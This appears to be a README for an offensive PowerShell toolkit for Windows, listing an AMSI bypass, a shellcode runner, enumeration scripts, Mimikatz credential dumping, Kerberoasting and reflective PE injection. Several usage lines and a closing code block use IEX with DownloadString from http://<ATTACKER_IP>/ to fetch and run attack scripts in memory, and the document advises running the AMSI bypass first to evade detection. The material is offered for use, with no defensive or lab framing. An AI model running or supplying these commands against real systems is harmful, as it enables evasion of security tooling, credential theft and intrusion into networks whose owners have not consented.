# PowerShell Tools

Reconnaissance, enumeration, and post-exploitation scripts for Windows environments.

## Evasion

| Script | Description | Usage |
|---|---|---|
| `AMSIBypass.ps1` | Disables AMSI by patching the AmsiContext in memory via reflection. Run this before loading other scripts to avoid signature-based detection. | `IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/AMSIBypass.ps1')` |
| `pwshShellcodeRunnerX64.txt` | Allocates RWX memory with `VirtualAlloc`, copies x64 shellcode, and executes it in a new thread. Replace the `$buf` byte array with your own msfvenom payload. | `IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/pwshShellcodeRunnerX64.txt')` |

## Enumeration

| Script | Description | Usage |
|---|---|---|
| `HostRecon.ps1` | Local host reconnaissance — users, groups, network config, installed software, scheduled tasks. | `. .\HostRecon.ps1; Invoke-HostRecon` |
| `Invoke-WinEnum.ps1` | Windows enumeration — system info, users, services, firewall rules, and more. | `. .\Invoke-WinEnum.ps1; Invoke-WinEnum` |
| `Invoke-winPEAS.ps1` | Automated privilege escalation checker. Scans for misconfigurations, weak permissions, and escalation paths. | `. .\Invoke-winPEAS.ps1` |
| `Invoke-Seatbelt.ps1` | Security-focused system survey — checks credentials, browser data, audit policies, and more. | `. .\Invoke-Seatbelt.ps1; Invoke-Seatbelt -group=all` |
| `PowerView_dev.ps1` | Active Directory enumeration — domains, users, groups, GPOs, ACLs, trusts, shares. | `. .\PowerView_dev.ps1; Get-DomainUser` |

## Post-Exploitation

| Script | Description | Usage |
|---|---|---|
| `Invoke-Mimikatz.ps1` | Credential extraction from LSASS memory — passwords, hashes, Kerberos tickets. | `. .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -DumpCreds` |
| `Invoke-Rubeus.ps1` | Kerberos attacks — AS-REP roasting, Kerberoasting, ticket requests, pass-the-ticket. | `. .\Invoke-Rubeus.ps1; Invoke-Rubeus kerberoast` |
| `Invoke-ReflectivePEInjection.ps1` | Load a PE (DLL/EXE) reflectively into memory without writing to disk. | `. .\Invoke-ReflectivePEInjection.ps1; Invoke-ReflectivePEInjection -PEBytes $bytes` |
| `powermad.ps1` | AD exploitation — machine account manipulation, DNS record abuse, ADIDNS attacks. | `. .\powermad.ps1; New-MachineAccount -MachineAccount "FAKE01"` |

## Loading Scripts Remotely

```powershell
# 1. Bypass AMSI first
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/AMSIBypass.ps1')

# 2. Load any script in-memory
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView_dev.ps1')
```
